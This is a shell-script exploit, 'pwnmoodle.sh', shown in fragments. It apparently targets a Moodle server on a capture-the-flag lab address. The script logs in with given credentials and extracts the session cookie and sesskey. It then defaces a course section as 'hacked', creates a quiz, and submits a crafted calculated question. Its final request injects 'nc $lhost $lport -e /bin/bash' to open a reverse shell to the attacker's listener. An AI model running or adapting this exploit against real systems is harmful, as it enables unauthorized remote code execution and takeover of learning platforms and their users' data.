...
usage()
{
echo -e '\e[00;35m EXAMPLE USAGE:\e[00m\e[00;32m ./pwnmoodle.sh -u http://10.10.10.10 -U username -P password -l 10.10.14.11 -p 4444 \e[00m\n'
}

get_cookie()
{
test_login=$(curl -L -s -X POST --data "anchor=&username=$username&password=$password" --cookie-jar ./tmp.txt "http://10.10.10.153/moodle/login/index.php" 2>&1)
test_cookie=$(cat ./tmp.txt)
}

test_cookie()
{
one=$(curl -i --cookie ./tmp.txt $url/moodle/my/ -w '%{http_code}' -o /dev/null -s)
if [ $one -eq 200 ]; then
...
get_sesskey()
{
two=$(curl -s -i --cookie $cookie ./tmp.txt http://10.10.10.153/moodle/my/ 2>&1)
sesskey=$(echo "$two" | grep -oh sesskey='[a-zA-Z0-9]*'| cut -d"=" -f2- | tail -1)
}


create_hacked()
{
hacked=$(curl --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data '[{"index":0,"methodname":"core_update_inplace_editable","args":{"itemid":"2","component":"format_topics","itemtype":"sectionname","value":"hacked"}}]' --cookie ./tmp.txt $url/moodle/lib/ajax/service.php?sesskey=$sesskey&info=core_update_inplace_editable)
...
hacked_quizz=$(curl -L --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data $quizz_data --cookie ./tmp.txt $url/moodle/course/modedit.php)
hacked_status1=$(echo "$hacked_quizz" | grep -o cmid='[0-9][0-9]*'| sed 's/[^0-9]*//g' | tail -1)
cmid=$hacked_status1
...
exploit_gen=$(curl -L --silent --write-out "HTTPSTATUS:%{http_code}" -X POST --data $exploit_data --cookie ./tmp.txt $url/moodle/question/question.php)
...
ex=$(curl -L -s --cookie ./tmp.txt "$url/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid=$cmid%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=9&wizardnow=datasetitems&cmid="$cmid"&cmd=nc%20$lhost%20$lport%20-e%20/bin/bash")
}
...
while getopts "hu:U:P:l:p:" option; do
 case "${option}" in
    U) username=${OPTARG};;
    P) password=${OPTARG};;
    l) lhost=${OPTARG};;
